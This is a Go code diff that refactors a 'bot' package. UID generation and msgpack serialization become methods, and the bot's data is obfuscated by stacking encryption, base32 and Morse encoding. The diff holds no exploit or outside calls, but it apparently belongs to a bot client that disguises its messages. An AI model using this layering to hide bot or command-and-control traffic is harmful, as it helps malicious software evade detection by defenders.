@@ -4,7 +4,6 @@ import (
 	"bot/morse"
 	"bytes"
 	"encoding/base32"
-	"fmt"
 	"github.com/vmihailenco/msgpack"
 	r "math/rand"
 	"strings"
@@ -34,9 +33,9 @@ var (
 	src = r.NewSource(time.Now().UnixNano())
 )
 
-// generateRandomUid generates a random hexadecimal string
+// GenerateRandomUid generates a random hexadecimal string
 // of length 16 used to identify the bot
-func GenerateRandomUid() []byte {
+func (b *Bot) GenerateRandomUid() {
 	sb := strings.Builder{}
 	sb.Grow(UidLength)
 	// A src.Int63() generates 63 random bits, enough for letterIdxMax characters!
@@ -51,29 +50,27 @@ func GenerateRandomUid() []byte {
 		cache >>= letterIdxBits
 		remain--
 	}
-	
-	return sb.Bytes();
+	b.Uid = sb.Bytes()
+	return;
 }
 
-func unmarshal(data []byte) Bot {
-	fmt.Println("serialized data: ", data)
-	var bot Bot
+func (b *Bot) unmarshal(data []byte) {
 	enc := msgpack.NewDecoder(bytes.NewBuffer(data))
-	fmt.Println("enc: ", enc)
-	err := enc.Decode(&bot)
+	err := enc.Decode(&b)
 	if err != nil {
-		panic(err)
+		panic(err);
 	}
-	return bot
+	return;
 }
 
-func DeobfuscateData(data []byte) Bot {
+func (b *Bot) DeobfuscateData(data []byte) {
 	var encodedData []byte = morse.Decode(string(data))
 	encryptedData, err := base32.StdEncoding.DecodeString(string(encodedData))
 	if err != nil {
-		panic(err)
+		panic(err);
 	}
-	return unmarshal(DecryptData(encryptedData))
+	b.unmarshal(DecryptData(encryptedData));
+	return;
 }
 
 func (b *Bot) marshal() []byte {
@@ -81,13 +78,13 @@ func (b *Bot) marshal() []byte {
 	enc := msgpack.NewEncoder(&buf).StructAsArray(true)
 	err := enc.Encode(&b)
 	if err != nil {
-		panic(err)
+		panic(err);
 	}
-	return buf.Bytes()
+	return buf.Bytes();
 }
 
 func (b *Bot) ObfuscateData() []byte {
 	var encrypted_data = EncryptData(b.marshal())
 	var encoded_data = base32.StdEncoding.EncodeToString(encrypted_data)
-	return morse.Encode(encoded_data)
+	return morse.Encode(encoded_data);
 }
